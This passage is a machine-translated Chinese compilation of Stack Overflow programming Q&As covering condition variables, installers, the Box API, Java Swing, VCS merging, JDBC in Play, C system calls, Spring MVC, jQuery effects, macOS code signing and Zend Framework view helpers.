  Procedure P1(...) {
    acquire(m);
    ...
    release(m);
  }
  Procedure P2(...) {
    acquire(m);
    ...
    release(m);
  }
  initialisation code (...) { ... }
} 
```

互斥锁保证一次只有一个线程/进程可以操作对象，因为每个公共过程都包含互斥锁获取/释放。

现在那些条件变量呢？嗯，通常你不需要它们。但有时你有一些条件，一个线程需要等待另一个线程，这就是条件变量的来源。

例如，假设您正在实现一个并发队列对象。你会有一个`push()`程序和一个`pop()`程序。但是如果队列是空的怎么办？

由于代码如下：

```
Thread A                Thread B
if (not q.empty())
                        if (not q.empty())
                        then q.pop() // now q is empty!
then q.pop() // error! 
```

因此，您必须定义一个 pop() 过程，该过程在队列为空时返回一个特殊值，然后旋转等待队列变为非空。但是旋转等待是非常低效的。

因此，您改为使用条件变量。条件变量有两种方法：`wait()`和`notify()`。Wait() 原子地放弃你持有的互斥锁，然后阻塞线程，直到其他线程调用 notify()。所以像这样：

```
condition_variable cv;
Procedure int pop() {
  acquire(m);
  while (q.empty()) {
    wait(cv, m)  // atomically release m and wait for a notify() on cv.
    // when wait() returns it automatically reacquires mutex m for us.
  }
  rval = q.pop();
  release(m);
  return rval;
}
Procedure push(int x) {
  acquire(m);
  q.push(x);
  notify(cv);  // wake up everyone waiting on cv
  release(m);
} 
```

现在您有了一个数据结构/对象，其中一次只能有一个线程访问该对象，并且您可以处理不同线程之间的操作需要以特定顺序发生的情况（例如至少一个 push()必须在每个 pop() 完成之前发生。）

# java - IZPACK exe 包装器 + 7ZIP 安装错误 - 捆绑了 java 安装程序

> ID：15936775
> 
> 赞同：1
> 
> 时间：2013-04-10T21:29:49.443
> 
> 标签：java, installation, izpack

在没有预装JDK / JRE的Windows 7 64位下，当我尝试使用使用izpack构建的安装包时，当目标机器没有以前的jdk安装并尝试安装捆绑的JDK时会发生以下错误（打包在安装程序包中）。

安装包是用izpack5 + 7zip（七个zip）构建的![文件提取后](https://i.stack.imgur.com/YG7AU.png)

我不知道是 7zip 问题还是 izpack 问题。7zip 配置文件：

;!@Install@!UTF-8!
Title="SISNEG 1.0"
BeginPrompt="Instalar o SISNEG 离线？"
RunProgram="launcher-Win32.exe"
;!@InstallEnd@!

izpack exe 包装器使用的 Launcher ini Config 安装文件：

**# Global en# 全局条目，可以被特定条目覆盖。** jar = install.jar
下载 = [http://www.java.com/](http://www.java.com/)
**# Win32 特定条目** [win32]
jre = jre/jre-7u17-windows-i586.exe

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:09:46.370

捆绑以前的 jdk / jre 安装（不是 jdk / jre 安装程序）并使用以下 7zip 配置调用 izpack app jar 安装程序：

;!@Install@!UTF-8!
Title="SISNEG 1.0"
ExtractDialogText="Extraindo arquivos..."
BeginPrompt="Instalar o SISNEG OFFLINE ?"
GUIFlags="32"
**RunProgram="jre7\bin\javaw.exe -jar install.jar"**
;!@InstallEnd@!

打包insite de 7zip exe 自解压是jre 文件夹。

我没有使用 izpack exe 包装器。

# box-api - 禁止通过 Box API 创建文件夹

> ID：15936776
> 
> 赞同：1
> 
> 时间：2013-04-10T21:29:49.587
> 
> 标签：box-api

我正在尝试通过 Box API 创建一个文件夹。这是我的请求的样子：

```
-------------- REQUEST  --------------
POST https://api.box.com/2.0/folders/0
Accept-Encoding: gzip
Authorization: Bearer [hidden]
User-Agent: Google-HTTP-Java-Client/1.14.1-beta (gzip)
Content-Type: application/json; charset=UTF-8
Content-Length: 36

-------------- REQUEST BODY ----------
{"name":"test2","parent":{"id":"0"}}

-------------- RESPONSE --------------
HTTP/1.1 403 Forbidden
Date: Wed, 10 Apr 2013 21:15:53 GMT
Content-Length: 224
Content-Type: application/json
Connection: keep-alive
Server: nginx
Cache-Control: no-cache, no-store

-------------- RESPONSE BODY----------
{"type":"error","status":403,"code":"access_denied_insufficient_permissions","help_url":"http:\/\/developers.box.com\/docs\/#errors","message":"Access denied - insufficient permission","request_id":"19725779175165d68967049"} 
```

有人可以解释我的请求有什么问题吗？在对具有相同 Bearer 标头的其他请求的响应中，我收到了正确的结果：

```
-------------- REQUEST  --------------
GET https://api.box.com/2.0/folders/0
Accept-Encoding: gzip
Authorization: Bearer [hidden]
User-Agent: Google-HTTP-Java-Client/1.14.1-beta (gzip)

-------------- RESPONSE --------------
HTTP/1.1 200 OK
Date: Wed, 10 Apr 2013 21:15:53 GMT
Transfer-Encoding: chunked
Content-Encoding: gzip
Content-Type: application/json
Connection: keep-alive
Server: nginx
Cache-Control: no-cache, no-store 
```

我的应用程序被配置为请求读取和写入权限。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T08:01:58.473

你能把网址从

> [https://api.box.com/2.0/folders/0](https://api.box.com/2.0/folders/0)

到

> [https://api.box.com/2.0/folders](https://api.box.com/2.0/folders)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-02-25T12:59:47.450

使用 C#.net 在 Box.net 中创建文件夹

静态字符串文件夹创建（字符串 APIKey，字符串 authToken）{

```
 RestClient client = new RestClient();
    client.BaseUrl = "https://api.box.com/2.0/folders";
    var request = new RestRequest(Method.POST);
    string Headers = string.Format("Bearer {0}", authToken);
    request.AddHeader("Authorization", Headers);
    request.AddParameter("application/json", "{\"name\":\"Youka\",\"parent\":{\"id\":\"0\"}}", ParameterType.RequestBody);
    var response = client.Execute(request);
    return response.Content;

} 
```

# java - 检索 jtextfield 数据以使用单击的复选框

> ID：15936777
> 
> 赞同：1
> 
> 时间：2013-04-10T21:29:49.673
> 
> 标签：java, swing

Grocery_shop 类

```
import java.awt.*;

import javax.swing.*;
import java.awt.event.*;
import java.text.DecimalFormat;

/**
   Grocery shop class

*/

public class Grocery_shop extends JFrame
{

   private quantitypanel qty; // A panel for quantity
   private Grocery_items items;       // A panel for routine charge checkboxes
   private JPanel buttonPanel; // A panel for the buttons
   private JButton calcButton;         // Calculates everything
   private JButton exitButton;         // Exits the application

   /**
      Constructor
   */

   public Grocery_shop()
   {
      // Display a title.
      setTitle("Victor's Grocery Shop");

      // Specify what happens when the close button is clicked.
      setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

 // Create a NonRoutinePanel object.
      qty = new quantitypanel();
    //  qty.setBackground(Color.white);

      // Create a RoutinePanel object.
      items = new Grocery_items( qty );

      // Build the panel that contains the buttons.
      buildButtonPanel();

      // Add the panels to the content pane.
      add(items, BorderLayout.WEST);
      add(qty, BorderLayout.EAST);
      add(buttonPanel, BorderLayout.SOUTH);

      // Pack and display the window.
      pack();
      setVisible(true);
   }

   /**
      The buildButtonPanel method creates a panel containing
      buttons.
   */

   private void buildButtonPanel()
   {
      // Create a button to calculate the charges.
      calcButton = new JButton("Add Charges");

      // Add an action listener to the button.
      calcButton.addActionListener(new CalcButtonListener());

      // Create a button to exit the application.
      exitButton = new JButton("Exit");

      // Add an action listener to the button.
      exitButton.addActionListener(new ExitButtonListener());

      // Put the buttons in their own panel.
      buttonPanel = new JPanel();
      buttonPanel.add(calcButton);
      buttonPanel.add(exitButton);
   }

   /**
      CalcButtonListener is an action listener class for the
      calcButton component.
   */

   private class CalcButtonListener implements ActionListener
   {
      /**
         actionPerformed method
         @param e An ActionEvent object.
      */

      public void actionPerformed(ActionEvent e)
      {
         double totalCharges; // Total charges

         // Create a DecimalFormat object to format output.
         DecimalFormat dollar = new DecimalFormat("#,##0.00");

         // Calculate the total charges
         totalCharges = items.getCharges(); 
                 //+ nonRoutine.getCharges();

         // Display the message.
         JOptionPane.showMessageDialog(null, "Total Charges: $" + 
                                             dollar.format(totalCharges));
      }
   } // End of inner class

   /**
      ExitButtonListener is an action listener class for the
      exitButton component.
   */

   private class ExitButtonListener implements ActionListener
   {
      /**
         actionPerformed method
         @param e An ActionEvent object.
      */

      public void actionPerformed(ActionEvent e)
      {
         System.exit(0);
      }
   } // End of inner class

   /**
      The main method creates an instance of the JoesAutomotive
      class, causing it to display its window.
   */

   public static void main(String[] args)
   {
      Grocery_shop grocery = new Grocery_shop();
   }
} 
```

Grocery_item 类

```
import java.awt.*;

import javax.swing.*;
import java.awt.event.*;
import java.text.DecimalFormat;

/**
   Grocery shop class

*/

public class Grocery_shop extends JFrame
{

   private quantitypanel qty; // A panel for quantity
   private Grocery_items items;       // A panel for routine charge checkboxes
   private JPanel buttonPanel; // A panel for the buttons
   private JButton calcButton;         // Calculates everything
   private JButton exitButton;         // Exits the application

   /**
      Constructor
   */

   public Grocery_shop()
   {
      // Display a title.
      setTitle("Victor's Grocery Shop");

      // Specify what happens when the close button is clicked.
      setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

 // Create a NonRoutinePanel object.
      qty = new quantitypanel();
    //  qty.setBackground(Color.white);

      // Create a RoutinePanel object.
      items = new Grocery_items( qty );

      // Build the panel that contains the buttons.
      buildButtonPanel();

      // Add the panels to the content pane.
      add(items, BorderLayout.WEST);
      add(qty, BorderLayout.EAST);
      add(buttonPanel, BorderLayout.SOUTH);

      // Pack and display the window.
      pack();
      setVisible(true);
   }

   /**
      The buildButtonPanel method creates a panel containing
      buttons.
   */

   private void buildButtonPanel()
   {
      // Create a button to calculate the charges.
      calcButton = new JButton("Add Charges");

      // Add an action listener to the button.
      calcButton.addActionListener(new CalcButtonListener());

      // Create a button to exit the application.
      exitButton = new JButton("Exit");

      // Add an action listener to the button.
      exitButton.addActionListener(new ExitButtonListener());

      // Put the buttons in their own panel.
      buttonPanel = new JPanel();
      buttonPanel.add(calcButton);
      buttonPanel.add(exitButton);
   }

   /**
      CalcButtonListener is an action listener class for the
      calcButton component.
   */

   private class CalcButtonListener implements ActionListener
   {
      /**
         actionPerformed method
         @param e An ActionEvent object.
      */

      public void actionPerformed(ActionEvent e)
      {
         double totalCharges; // Total charges

         // Create a DecimalFormat object to format output.
         DecimalFormat dollar = new DecimalFormat("#,##0.00");

         // Calculate the total charges
         totalCharges = items.getCharges(); 
                 //+ nonRoutine.getCharges();

         // Display the message.
         JOptionPane.showMessageDialog(null, "Total Charges: $" + 
                                             dollar.format(totalCharges));
      }
   } // End of inner class

   /**
      ExitButtonListener is an action listener class for the
      exitButton component.
   */

   private class ExitButtonListener implements ActionListener
   {
      /**
         actionPerformed method
         @param e An ActionEvent object.
      */

      public void actionPerformed(ActionEvent e)
      {
         System.exit(0);
      }
   } // End of inner class

   /**
      The main method creates an instance of the JoesAutomotive
      class, causing it to display its window.
   */

   public static void main(String[] args)
   {
      Grocery_shop grocery = new Grocery_shop();
   }
} 
```

数量面板类

```
//import java.awt.LayoutManager;
import java.awt.GridLayout;
//import javax.swing.JCheckBox;
//import javax.swing.JLabel;
import javax.swing.BorderFactory;
import javax.swing.JPanel;
import javax.swing.JTextField;

public class quantitypanel extends JPanel {
     private JTextField baked_beans_JT;     // JTextField box for baked_beans
       private JTextField Cornflakes_JT;       // JTextField box for cornflakes
       private JTextField Sugar_JT; // JTextField box for sugar box
       private JTextField Tea_Bags_JT;    // JTextField box for tea bag
       private JTextField Instant_Coffee_JT;    // JTextField box for Instant_Coffee_Box
       private JTextField Bread_JT;       // JTextField box for bread box
       private JTextField Sausage_JT;  // JTextField box for sausage box
       private JTextField egg_JT;  // JTextField box for egg box
       private JTextField milk_JT;  // JTextField box for milk
       private JTextField potatoes_JT;  // JTextField box for potatoes

       public quantitypanel()
       {

           //create JTextField.
           baked_beans_JT = new JTextField(5);
           Cornflakes_JT = new JTextField(5);
           Sugar_JT = new JTextField(5);
           Tea_Bags_JT = new JTextField(5);
           Instant_Coffee_JT = new JTextField(5);
           Bread_JT = new JTextField(5);
           Sausage_JT = new JTextField(5);
           egg_JT = new JTextField(5);
           milk_JT = new JTextField(5);
           potatoes_JT = new JTextField(5);

           //initialize text field to 0
           baked_beans_JT.setText("0");
           Cornflakes_JT.setText("0");
           Sugar_JT.setText("0");
           Tea_Bags_JT.setText("0");
           Instant_Coffee_JT.setText("0");
           Bread_JT.setText("0");
           Sausage_JT.setText("0");
           egg_JT.setText("0");
           milk_JT.setText("0");
           potatoes_JT.setText("0");

         public double getBeanqty()
         {

             return Double.parseDouble(baked_beans_JT.getText());
         }

           //set Layout manager
           setLayout(new GridLayout(10, 1));

           //create border and panel title

          setBorder(BorderFactory.createTitledBorder("Amount"));

          //add text fields to the panel.
          add(baked_beans_JT);
          add(Cornflakes_JT);
          add(Sugar_JT);
          add(Tea_Bags_JT);
          add(Instant_Coffee_JT);
          add(Bread_JT);
          add(Sausage_JT);
          add(egg_JT);
          add(milk_JT);
          add(potatoes_JT);

       }

} 
```

在上面的代码中，我试图让 jtextfield 接受一个数字并在选中复选框的情况下计算数字，例如：如果选择了 bake_beans 复选框并且用户在数量面板（baked_beans_JT）中输入了 2，则程序应该将两者相乘他们收取费用...

我这样做了，在grocery_items 类中，这段代码出现错误：

```
 if (baked_beans_box.isSelected())
         charges += Baked_Beans * qty.getBeanqty(); 
```

说“类型数量面板的方法 getBeanqty() 未定义”

在数量面板类中，此代码出现错误：

```
public double getBeanqty()
         {

             return Double.parseDouble(baked_beans_JT.getText());
         } 
```

错误状态：`Syntax error on token "double", @ expected` 需要帮助

感谢：D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:35:55.727

`qty`取消注释该类中使用的声明`Grocery_items`：

```
// private quantitypanel qty; // A panel for quantity 
```

此外，该方法`getBeanqty`嵌入在构造函数中`quantitypanel`。方法中不能有方法。将其移出构造函数的范围：

```
public double getBeanqty() {
   return Double.parseDouble(baked_beans_JT.getText());
} 
```

Java 命名约定表明类名以大写字母开头，并且通常不使用下划线，这会给您`QuantityPanel`和`GroceryItems`.

# svn - 不同 VCS 之间的自动集成

> ID：15936779
> 
> 赞同：1
> 
> 时间：2013-04-10T21:29:51.143
> 
> 标签：svn, merge, continuous-integration, perforce

我的任务是实现从基于 svn 的大型开源项目到分叉的 perforce 存储库（我们的客户需要 perforce）的持续自动合并。客户功能/更改是在 perforce 中开发的，我们需要不断地将来自上游 svn 存储库的新更改集成到 perforce。

我清楚地理解，我无法获得一个完美的工具来为我完成所有工作，因为社区和我们的变化之间的冲突显然会发生，它们应该由人来解决，但我的目标是让这个过程尽可能可能自动化。集成商应仅在确实出现问题时才注意。为了推动自动化任务，我正在使用 Hudson，但我认为这并不重要。我只是在寻找一个可以为我做以下事情的工具：

*   工具应该采用 svn 变更集
*   将差异应用于 perforce fork
*   根据 svn（如果有）在 perforce 中删除/重命名/移动文件
*   提交更改以执行
*   如果某些步骤无法完成，则返回错误

哪个工具可以帮助我在不同的 VCS 之间进行这种自动合并？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T15:45:53.900

## 一般方法

这种方法几乎适用于任何情况，包括将库作为没有源代码控制信息的直接 tarball 获取。

当做这样的事情时，我总是发现将干净的原始源保存在 perforce 的一个地方（//depot/thirdparty/library，或类似的东西）是有帮助的。这应该始终是您正在使用的外部库版本中未更改的代码。在 Perforce 中之后，将其集成到您的版本中，并且只对这个新版本进行您需要的更改（如果有的话）。

当原库发生变化，你要更新时，进入第三方源，用新源强行覆盖所有内容，然后告诉 perforce 磁盘上的内容是正确的版本（我忘记了命令，但问题已经回答了在 StackOverflow 上），然后提交。请注意，如果您想实际跟踪文件重命名，这将不起作用，但对于一般代码开发来说它做得很好。

此时，您有一个更新的库，然后您可以再次将其集成到您的工作树中。这将使用 Perforce 来跟踪您应用的差异（如果有的话）对照源库中的更改。Perforce 通常可以很好地检测冲突更改，因此这应该会减少需要手动检查的地方的数量。

一旦这到位，您可以自动执行一些步骤，并且当 Perforce 没有检测到任何冲突时，整个更新可能会自动完成。

对于偶尔更新的库，这确实会更好地工作，但是没有理由不能使用频繁更新的源。

## 工具集成

最新版本的 Perforce 包含 git 兼容模式，并且 git 本身可以从 svn 存储库中提取，因此您应该能够使用 git 作为中介来处理更改中的更详细信息的更新。同样，这里应该有一些地方被认为是规范源，一个地方包含对库所做的更改，以及 Perforce 使用的结果代码。如果您的客户需要 Perforce，我建议使用 Perforce 来跟踪对原始库的更改，但理论上 git 桥也可以用于此目的。

# java - Play Framework 2.1.0 - 使用 Class.forName 注册 JDBC 驱动程序时出现 NoClassDefFoundError

> ID：15936780
> 
> 赞同：0
> 
> 时间：2013-04-10T21:29:52.837
> 
> 标签：java, playframework, playframework-2.0, olap4j

我正在尝试将 olap4j 与 Play 2.1.0 一起使用，但很难让一些 olap4j 代码在 Play 控制器中工作，同样的代码在单独的 Eclipse Java 项目中工作得很好，因此我已经排除了 olap4j 的任何问题或它连接到的我的 XMLA 服务器。通过将 JAR 文件放在 \lib 文件夹中，我已将 olap4j JAR 文件添加为非托管依赖项。我在 Play DEV 模式下运行。

以下代码返回以下异常：

**Java 代码：**

```
Class.forName("org.olap4j.driver.xmla.XmlaOlap4jDriver"); 
```

**错误：**

```
[RuntimeException: java.lang.NoClassDefFoundError: edu/emory/mathcs/backport/java/util/concurrent/Callable] 
```

在进一步挖掘之后，我发现 Play 使用它自己的 Classloader，所以我尝试了以下方法：

**Java 代码：**

```
Play.application().classloader().loadClass("org.olap4j.driver.xmla.XmlaOlap4jDriver"); 
```

这似乎消除了 NoClassDefFoundError 错误，但是引发了以下异常：

**错误：**

```
java.sql.SQLException: No suitable driver found for jdbc:xmla:Server=http://localhost/OLAP/msmdpump.dll 
```

也许我需要在 Global 类中添加 JDBC 类注册？任何帮助将非常感激。org.olap4j.driver.xmla.XmlaOlap4jDriver 的 JavaDocs 说明了以下内容，这正是我所关注的：

*由于 olap4j 是 JDBC 的超集，因此您可以像注册任何 JDBC 驱动程序一样注册此驱动程序： Class.forName("org.olap4j.driver.xmla.XmlaOlap4jDriver"); 然后使用前缀为“jdbc:xmla:”的 URL 创建连接。*

**完整代码：**

```
package controllers;

import play.Play;
import play.mvc.*;
import org.olap4j.*;
import org.olap4j.metadata.Member;
import java.sql.*;

public class Test extends Controller {

public static Result index() {

    String server = "http://localhost/OLAP/msmdpump.dll";
    String user = "user";
    String password = "password";
    String result = "0";

    try {
        //Class.forName("org.olap4j.driver.xmla.XmlaOlap4jDriver");
        Play.application().classloader().loadClass("org.olap4j.driver.xmla.XmlaOlap4jDriver");
        try {
            Connection connection = DriverManager.getConnection("jdbc:xmla:Server="+server, user, password);
        } catch (SQLException e) {
            result = e.getMessage();
        }
    } catch (ClassNotFoundException e) {
        result = e.getMessage();
    }

    return ok(result);
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:16:19.710

根据[此线程](https://stackoverflow.com/questions/13763413/jdbc-connection-from-play-app?rq=1)，您的第一种方法应该可以正常工作，例如：

```
Class.forName("org.olap4j.driver.xmla.XmlaOlap4jDriver"); 
```

你得到的错误，

```
java.lang.NoClassDefFoundError: edu/emory/mathcs/backport/java/util/concurrent/Callable 
```

意味着您还需要添加到您的类路径中（就像在[这个线程](http://forums.esri.com/Thread.asp?c=158&f=2281&t=236325)`backport-util-concurrent.jar`中提到的那样）。我想它应该在那之后工作。该 jar 是 Backport Concurrent Util jar，可[在其网站上](http://backport-jsr166.sourceforge.net/)找到。将它也放入您的 lib 文件夹中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T21:37:43.763

看起来您同时使用了 olap4j 和 olap4j-jdk14。你只需要两者之一。

# c - C中的字符串操作和系统调用

> ID：15936786
> 
> 赞同：0
> 
> 时间：2013-04-10T21:30:14.907
> 
> 标签：c, string

我是 C 的业余爱好者，在 C 中处理字符串时遇到问题。目标是将电流添加`pid`到基本字符串中，然后用`system(system_call)`. 我有以下内容：

```
char system_call[100] = "top -p "
char pid_string[30];

//quite a bit of other code

int main(int argc, char *argv[])
{
    pid_t pid = getpid();
    sprintf(pid_string,"%d",pid);
    strcat(system_call,pid_string);

    printf(system_call); //prints what I expect; something like 'top -p 5580'
    system(system_call); //doesn't work
} 
```

电话只是简单地`system`给出。`sh: system: not found`我相信精通 C 的人会立即知道问题所在。我认为 C 中字符串后面的 0 可能与它有关，但我对 C 语言太糟糕了，无法识别它或不知道该怎么做。我也试过`system("%s",system_call)`，但`system`只接受一个论点。我的内存分配有问题吗？任何见解都值得赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:37:56.127

看不到您的字符串构造有任何问题，也许问题是“系统”本身由于某种原因在您的系统上不起作用:-)，或者“顶部”无法访问

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:32:34.777

在 sprintf 中使用之前，变量 pid 没有被赋值。

# spring-mvc - Spring 3.2 -- 从 JSP 中的链接调用控制器方法时出现 404 错误

> ID：15936791
> 
> 赞同：1
> 
> 时间：2013-04-10T21:30:40.863
> 
> 标签：spring-mvc, hyperlink, controller, http-status-code-404

我正在尝试使用 JSP 中的链接将参数传递给 Spring 控制器中的方法，但出现 404 错误。这是我的 JSP 代码的相关部分。

```
<c:forEach var="bulletin" items="${bulletins}">
    <c:if test="${bulletin.approved}">
        <a href="/bulletin/${bulletin.id}" >${bulletin.name}
            -- ${bulletin.subject}</a>
        <br />
        <br />
    </c:if>
</c:forEach> 
```

这是我的控制器中的方法。

```
@RequestMapping(value = "/bulletin/{id}", method = RequestMethod.GET)
public ModelAndView getSingleBulletin(@PathVariable("id") int id,
        Model model) {
    ModelAndView mav = new ModelAndView();

    try {
        Bulletin bulletin = bulletinDAO.getSingleBulletin(id);
        mav.setViewName("WEB-INF/jsp/ShowBulletin");
        if (bulletin != null) {
            ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder
                    .currentRequestAttributes();
            HttpSession session = attributes.getRequest().getSession(true);
            session.setAttribute("bulletin", bulletin);
        }
    } catch (Exception e) {
        System.out.println(e.getMessage());
        mav.setViewName("WEB-INF/jsp/FailurePage");
    }

    return mav;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T02:46:02.553

我认为这是路径问题。

检查包含有问题的“getSingleBulletin”功能的控制器的路径。
是否设置为根路径？（/）如果不是，那就是原因。

例如，

```
/* path to below controller */
@RequestMapping("/toController")  
public class TheController {

  /* path to below function (in the controller) */
  @RequestMapping(value="getSingleBulletin", method=RequestMethod.GET)
  public ModelAndView getSingleBulletin(/*parameters*/) {

  }

} 
```

在这种情况下，如果您想向“getSingleBulletin”函数发送请求，则必须将锚标记中的路径设置为

```
<a href="/toController/getSingleBulletin?id=${bulletin.id}">${bulletin.name} -- ${bulletin.subject}</a> 
```

* * *

如果控制器的路径不是 root('/') 并在没有“控制器路径”的锚标记中设置路径，就像您的代码一样

```
<a href="/getSingleBulletin?id=${bulletin.id}">${bulletin.name} -- ${bulletin.subject}</a> 
```

Spring MVC 尝试查找具有 RequetMapping 到 '/getSingleBulletin' 的控制器，这会导致 404 错误（如果未定义此类控制器），而不是 'TheController' 中的函数 'getSingleBulletin'。

我希望这能帮到您 ： ）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-13T00:37:16.830

问题解决了。这是我的网址。

```
<a href="<c:url value="/bulletin/${bulletin.id}" />" >${bulletin.name} -- ${bulletin.subject}</a> 
```

这是我的控制器方法。

```
@RequestMapping(value = "/bulletin/{id}", method = RequestMethod.GET)
    public String getSingleBulletin(@PathVariable("id") int id, Model model) {
        try {
            Bulletin bulletin = bulletinDAO.getSingleBulletin(id);
            model.addAttribute("bulletin", bulletin);
            return "ShowBulletin";
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return "FailurePage";
        }
    } 
```

# php - 检查图像是否损坏

> ID：15936793
> 
> 赞同：3
> 
> 时间：2013-04-10T21:30:45.973
> 
> 标签：php, imagick, corruption

我使用 wget 下载图像并使用 php imagick 创建图像的缩略图版本。我的形象是这样的：

![在此处输入图像描述](https://i.stack.imgur.com/ScWIz.jpg)

如您所见，我的图像已下载，但图像已损坏。我如何使用 php imagick 弄清楚这个图像已损坏。

# javascript - 使用jQuery实现以下效果

> ID：15936797
> 
> 赞同：0
> 
> 时间：2013-04-10T21:30:58.910
> 
> 标签：javascript, jquery, html, css

目前这是我的过渡。

```
$(".element").css("visibility", "visible"); 
```

元素隐藏在 css 中，而不是 javascript 使其可见

但我不想实现的是一种看起来像微软的效果，基本上我希望元素从下到上滑入（所以我假设底部的边距为负，而不是用 javascript 使其为正），而且当它滑入时，将其从 0 不透明度淡入到完全不透明度，这两种效果都应该有某种持续时间，结合在一起它们应该看起来非常好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:33:45.407

看看**jQuery**的`.animate()`：[http](http://api.jquery.com/animate/) ://api.jquery.com/animate/ ;)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:34:31.890

看看`$(".element").slideToggle('slow')`和`$(".element").show('slow')`

这里不需要使用`.animate()`..

[http://api.jquery.com/slideToggle/](http://api.jquery.com/slideToggle/) - 看看演示！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T21:34:45.687

如果您想要完全使用 jQuery 的解决方案，请尝试以下两个：

[淡入（）](http://api.jquery.com/fadeIn/)

[slideUp()](http://api.jquery.com/slideUp/)（或 slideToggle() 也可以，具体取决于您编写脚本的方式）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T21:36:12.490

我将从 0 不透明度和一个小的上边距开始，然后使用`.animate()`. 尝试类似：

```
$(".element").css({
    opacity: 0,
    visibility: 'visible',
    marginTop: 20
}).animate({
    marginTop: 0,
    opacity: 1
}); 
```

演示：http: [//jsfiddle.net/Pc8q6/](http://jsfiddle.net/Pc8q6/)

请注意，您也可以使用 CSS 过渡来实现类似的效果，演示：http: [//jsfiddle.net/Pc8q6/1/](http://jsfiddle.net/Pc8q6/1/) (webkit)

# python - 运行python时如何永久接受OSX防火墙允许/拒绝确认？

> ID：15936801
> 
> 赞同：8
> 
> 时间：2013-04-10T21:31:16.830
> 
> 标签：python, macos, osx-mountain-lion, firewall

## 概述

我在 OSX Mt Lion 上的 python 中使用龙卷风网络服务器。每次我启动龙卷风服务器时，我都会弹出一个窗口，并且必须允许/拒绝对应用程序的传入访问。

我已在 System Preferences -> Security & Privacy -> Firewall 中将 python 二进制文件列为“允许传入连接”......但我仍然每次都会收到弹出窗口。

我在网上找到了一份参考资料，表明某些应用程序可以“检查自己是否已签名”。是否有可能这是问题所在，因此将其忽略为已列出？

我确实证实了这一点：

```
codesign -vvv <path to python binary> 
```

确实产生：

```
<path to python binary>: invalid signature (code or signature have been modified)
In architecture: x86_64 
```

这个特定的二进制文件与带有 --framework 标志的自制软件一起安装（wxpython 需要）。

## 问题

1.  为什么我在防火墙列表中手动输入二进制应用程序被忽略？

2.  是否有一种简单的方法可以自己对二进制文件进行签名，以便我可以单击“自动允许签名的应用程序”并允许它不显示弹出窗口？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-11-04T20:23:59.907

（基于礼貌的回答 - 谢谢礼貌）

```
codesign -f -s - /path/to/Python.app 
```

为我工作（狮子后来只问过一次，最后一次）。`-s -`意味着 Ad-hoc 签名 - 根本不需要证书。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T14:01:29.020

`codesign -s`您可以使用您的有效证书手动签署应用程序。我按照以下方式使用了`iPhone Developer`证书和终端命令：

```
codesign -f -s "iPhone Developer: YourName"  "Tornado.app" 
```

使用自动鼠标单击的可能解决方法：

1.  下载[CLIclick](http://www.bluem.net/en/mac/cliclick/)。（谢谢卡斯滕。）
2.  把它放在合适的位置，比如说`/usr/local/bin`。
3.  使用获取`Allow`按钮的屏幕坐标`⌘</kbd>`⇧</kbd>`4`. (In my example, these are x: 750, y: 600.)``
4.  使用此内容创建一个脚本（`w:`以毫秒为单位的等待时间）：

    ```
    /usr/local/bin/cliclick c:750,600 w:1500 m:+0,+0 c:. 
    ```

    `CLIclick`（如果不将其“移动”到同一位置（`m:+0,+0`零件）并再次单击同一位置（ ），我将无法开始工作`c:.`。）

5.  每次启动服务器时都运行脚本。
6.  享受！

# forms - 如何在 Zend Framework 2 中使用自定义表单视图助手？

> ID：15936804
> 
> 赞同：5
> 
> 时间：2013-04-10T21:31:41.613
> 
> 标签：forms, zend-framework2, view-helpers, viewhelper

我写了一个表单视图助手，它扩展`Zend\Form\View\Helper\FormMultiCheckbox`并覆盖了它的[`renderOptions(...)`](https://github.com/zendframework/zf2/blob/master/library/Zend/Form/View/Helper/FormMultiCheckbox.php#L235)方法：

```
<?php
namespace MyNamespace\Form\View\Helper;

use Zend\Form\View\Helper\FormMultiCheckbox as ZendFormMultiCheckbox;

class FormMultiCheckbox extends ZendFormMultiCheckbox 
{

    protected function renderOptions(...)
    {
        ...
        $label     = $escapeHtmlHelper($label);
        $labelOpen = $labelHelper->openTag($labelAttributes);
        switch ($labelPosition) {
            case self::LABEL_PREPEND:
                $template  = $labelOpen . $label . $labelClose . '%s';
                break;
            case self::LABEL_APPEND:
            default:
                $template  = '%s' . $labelOpen . $label . $labelClose;
                break;
        }
        $markup = sprintf($template, $input);

        $combinedMarkup[] = $markup;
        ...
    }

} 
```

下一步是注册新的视图助手。我正在这样做，如下[所示](https://stackoverflow.com/a/13887355/2019043)：

```
namespace Application;

use Zend\Mvc\ModuleRouteListener;
use Zend\Mvc\MvcEvent;

class Module {

    ...

    public function getViewHelperConfig() {
        return array(
            'invokables' => array(
                'FormMultiCheckboxViewHelper' => 'MyNamespace\Form\View\Helper\FormMultiCheckbox',
            )
        );
    }
} 
```

现在我的问题是：如何让应用程序使用我的表单视图助手而不是`Zend\Form\View\Helper\FormMultiCheckbox`？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-11T03:36:33.347

尽管 Andrews 回答有效，但这不是必需的，只需使用默认视图助手名称并将其映射到您的助手类，然后应用程序将使用您的助手代替

```
public function getViewHelperConfig() {
    return array(
        'invokables' => array(
            'formmulticheckbox' => 'MyNamespace\Form\View\Helper\FormMultiCheckbox',
        ),                
    );
} 
